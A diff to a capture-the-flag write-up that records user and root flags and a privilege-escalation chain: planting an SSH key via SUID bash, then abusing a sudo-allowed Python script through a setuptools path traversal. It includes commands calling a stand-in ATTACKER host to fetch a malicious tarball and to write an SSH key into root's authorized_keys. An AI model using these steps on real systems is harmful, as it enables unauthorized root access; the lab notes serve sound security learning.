@@ -2,7 +2,7 @@
 
 ## FLAGS
 - **User: `f4475262258f659a46edceceb7b65c66`**
-- Root: pending (box died during exploit, need one more run)
+- **Root: `b7e6282bad4f4bb769efbc90e66db13d`**
 
 ## Full Attack Chain
 
@@ -21,11 +21,15 @@
 - **SUID bash can WRITE to steve's home but NOT read root:steve files (euid≠egid)**
 - Plant SSH authorized_keys via SUID bash → SSH in as real steve
 
-### 3. steve → root (pending)
+### 3. steve → root (CVE-2025-47273)
 - `sudo -l`: `(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *`
-- Uses `setuptools.package_index.PackageIndex().download()` → arbitrary code execution
-- Host malicious tar.gz with setup.py → `sudo install_validator.py http://ATTACKER/evil.tar.gz`
-- Box died before root flag. Need one more attempt.
+- setuptools 78.1.0 `PackageIndex().download()` has path traversal via URL-encoded slashes
+- `egg_info_for_url()` calls `urllib.parse.unquote()` on filename → `%2F` becomes `/`
+- `os.path.join(tmpdir, "/absolute/path")` discards tmpdir when second arg is absolute
+- Host SSH pubkey on attacker HTTP server (serve 200 for any path)
+- `sudo ... install_validator.py 'http://ATTACKER:8888/%2Froot%2F.ssh%2Fauthorized_keys'`
+- Writes attacker's SSH pubkey to `/root/.ssh/authorized_keys` as root
+- SSH as root → flag
 
 ## Critical Mistakes & Lessons
 
